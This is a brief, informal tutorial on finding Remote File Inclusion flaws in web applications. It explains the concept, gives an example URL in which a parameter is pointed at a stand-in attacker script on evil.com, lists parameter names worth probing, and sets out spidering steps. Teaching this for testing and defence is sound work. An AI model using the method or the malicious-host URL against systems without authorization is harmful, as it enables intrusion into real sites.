Remote File Inclusion 

Sometimes the domains/web applications include files from other Remote domains/web servers/web applications , normally they do it by requesting that resource through the URL/URI.
So the Remote File Inclusion vulnerability occurs when the user can change the address requested in the URl.
For example if a web application is requesting resource A then the attacker will change it and make the web application to request for resource B, which can be anything a payload or something else malicious.
for example - this is the original link-  https://example.com/path=https://sandust.com/img1

and then the attacker changes it to
https://example.com/path=https://evil.com/evilscript

words in the Url to check
dest
redirect
uri
continue
url
window
next
data
reference
site
html
val
validate
domain
callback
return
page
feed
host
port
to
out

How to find this Vulnerability ?

1. Spider the web application and search for the above mentioned keywords in the urls
2. Once you find any link with any of these keywords try changing the parameters given to them , to some other resource of the same type on any other domain/web server . etc
3. if that page includes the file from the address given by the attacker/user then it is vulnerable to remote file inclusion .
